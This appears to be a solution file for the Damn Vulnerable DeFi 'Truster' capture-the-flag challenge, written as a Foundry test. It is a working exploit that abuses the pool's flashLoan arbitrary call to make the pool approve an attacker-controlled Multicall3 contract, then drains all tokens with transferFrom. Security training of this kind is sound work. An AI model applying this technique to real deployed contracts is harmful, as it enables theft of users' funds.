// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import "lib/multicall/src/Multicall3.sol";
import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
import {TargetContract} from "../../src/truster/TargetContract.sol";

contract TrusterChallenge is Test{
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token
        token = new DamnValuableToken();

        // Deploy pool and fund it
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_truster() public checkSolvedByPlayer {
    
        // bytes[] memory calls = new bytes[](2);
        
       
        Multicall3  multicall3 = new Multicall3();
       
         Multicall3.Call3[] memory calls = new Multicall3.Call3[](2);
        
        bytes memory approveData = abi.encodeWithSignature(
        "approve(address,uint256)",
        address(multicall3),
        TOKENS_IN_POOL
    );


        // calls[0] = Multicall3.Call3({
        //     target: address(pool),
        //     allowFailure: false,  // 必须成功
        //     callData: abi.encodeWithSignature(
        //         "flashLoan(uint256,address,address,bytes)",
        //       0,    // 接收者
        //         address(target), 
        //          address(target),       
        //          abi.encodeWithSignature("execute(uint256,address,address)", TOKENS_IN_POOL,address(token),player)  // todo
        // )
        // });

         calls[0] = Multicall3.Call3({
            target: address(pool),
            allowFailure: false,  // 必须成功
            callData: abi.encodeWithSignature(
                "flashLoan(uint256,address,address,bytes)",
              0,    // 接收者
                player, 
                 address(token),       
                 approveData  // todo
        )
        });
        
        calls[1] = Multicall3.Call3({
            target: address(token),
            allowFailure: false,  // 必须成功
            callData:abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
             address(pool),
            recovery,
            TOKENS_IN_POOL
        )
        });
        
        multicall3.aggregate3(calls);
        
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All rescued funds sent to recovery account
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}
